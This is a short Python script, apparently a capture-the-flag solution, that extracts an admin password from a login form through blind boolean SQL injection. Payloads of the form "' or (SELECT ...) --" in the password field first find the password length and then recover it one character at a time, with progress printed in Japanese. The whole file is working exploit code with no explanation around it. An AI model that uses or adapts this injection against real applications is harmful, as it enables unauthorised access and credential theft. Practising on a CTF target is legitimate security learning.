import requests

url = "https://ctfq.u1tramarine.blue/q6/"
pass_length = 0
passwd="FLAG_"

def pass_length_measure ():
    for i in range(20):
        length=5
        data ={
            'id' : 'admin',
            'pass' : f"' or (SELECT LENGTH(pass) FROM user WHERE id ='admin') > {length+i} --"
        }

        response = requests.post(url, data=data)

        if "Congratulations" not in response.text:
            pass_length = length+i
            break
    print(f"[+] 成功:パスワードの長さは「{length+i}」")
    return length+i

def passwd_search(char, length):
    global passwd
    data ={
            'id' : 'admin',
            'pass' : f"' or (SELECT substr(pass, {length}, 1) FROM user WHERE id ='admin') = '{char}' --"
    }
    
    response = requests.post(url, data=data)

    if "Congratulations" in response.text:
        passwd +=char
        print(f"[+] 成功: pass = {passwd}")
        return True
    else:
        return False

def pass_crack(pass_length):
    length = 5
    while length != pass_length:
        length +=1
        for char in range (48, 123):    
            if passwd_search(chr(char), length):
                break


pass_length = pass_length_measure()
pass_crack(pass_length)
print(f"パスワードは「{passwd}」です。")
    